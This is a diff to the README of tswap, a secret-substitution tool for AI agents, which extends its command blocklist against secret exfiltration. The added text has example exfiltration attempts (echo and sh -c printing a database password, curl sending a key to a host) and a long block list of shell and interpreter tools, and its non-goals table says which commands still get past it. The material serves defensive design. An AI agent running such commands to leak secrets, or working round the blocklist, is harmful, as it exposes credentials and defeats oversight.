@@ -40,7 +40,7 @@ An AI agent **cannot**:
 - Set a secret to a known value (`add` requires sudo)
 - Enumerate secrets with metadata (`list` requires sudo)
 - Delete secrets (`delete` requires sudo)
-- Exfiltrate via `run` — `echo`, `printf`, pipes, and redirects are blocked
+- Exfiltrate via `run` — `echo`, `printf`, pipes, redirects, and inline shell/interpreter code (`sh -c`, `python -c`, ...) are blocked
 
 ### YubiKey Cold Storage
 
@@ -301,7 +301,7 @@ tswap prevents **accidental leaks and casual exfiltration** — it does not atte
 | Threat | How |
 |--------|-----|
 | AI agent sees plaintext secrets | Agents use `{{token}}` substitution via `run`; values never appear in agent context or shell history |
-| Casual exfiltration via `run` | Blocklist rejects `echo`, `printf`, `cat`, `env`, `printenv`, `set`, `tee`; pipes (`\|`) and redirects (`>`) are blocked |
+| Casual exfiltration via `run` | Blocklist rejects `echo`, `printf`, `cat`, `env`, `printenv`, `set`, `tee` (also by path, e.g. `/bin/echo`); pipes (`\|`) and redirects (`>`) are blocked; shells and interpreters given inline code or code from stdin are refused (`sh -c`, `bash -s`, `python -c`, `perl -e`, `node -e`, `bun -e`, `deno eval`, `php -r`, `julia -e`, `Rscript -e`, `osascript -e`, `expect -c`, `pwsh -Command`, `cmd /c`, `tclsh`/`jshell` reading stdin), as are `awk` without `-f`, `xargs`, `busybox`, `watch`, `parallel`, `script`, `ssh host <command>`, and `find -exec` running any of these, including behind wrappers and launchers (`timeout`, `nice`, `sudo`, `uv run`, `poetry run`, `npx`, `bundle exec`, `docker run`, `kubectl exec`), since inline code can transform a value past output redaction (#105). Script files stay allowed |
 | Secrets in config files / repos | `tocomment` replaces inline values with `# tswap:` markers; `redact` masks values for safe viewing |
 | Single YubiKey loss | XOR key reconstruction — either key derives the other via the stored XOR share |
 | Vault access without physical presence | Touch-required YubiKey slots (recommended config) require a button press to unlock |
@@ -312,7 +312,7 @@ tswap prevents **accidental leaks and casual exfiltration** — it does not atte
 | Non-goal | Why |
 |----------|-----|
 | Determined local attacker with root | Root can attach debuggers, read `/proc/*/mem`, or intercept syscalls — no userspace tool can prevent this |
-| Sophisticated exfiltration via `run` | The blocklist is shallow by design. Commands like `curl`, `python`, `cp`, or custom binaries can still exfiltrate secrets passed through token substitution |
+| Sophisticated exfiltration via `run` | The blocklist is shallow by design. Commands like `curl`, `cp`, a script file, or custom binaries can still exfiltrate secrets passed through token substitution |
 | Compromised YubiKey firmware | tswap trusts `ykman` and the YubiKey's HMAC-SHA1 implementation; firmware-level attacks are out of scope |
 | Secrets in process memory | During `run`, the substituted command (with plaintext values) exists in the subprocess memory. Memory forensics or core dumps could recover it |
 | Network interception | Once a secret is passed to a legitimate program (e.g., `psql`, `rclone`), tswap has no control over how that program transmits it |
@@ -600,7 +600,11 @@ Attempts to exfiltrate are blocked:
 
 ```bash
 tswap run echo {{db-password}}
-# Error: The command 'echo' would expose secret values.
+# Error: 'echo' would expose secret values. ...
+
+tswap run sh -c 'echo {{db-password}} | rev'
+# Error: 'sh -c' runs inline code, which can transform and print secrets past redaction.
+#        Put the commands in a script file and run that instead, e.g. 'run ./script.sh {{secret}}' ...
 
 tswap run curl http://example.com/?key={{db-password}} | cat
 # Error: Pipes and output redirection are not allowed in 'run' commands.
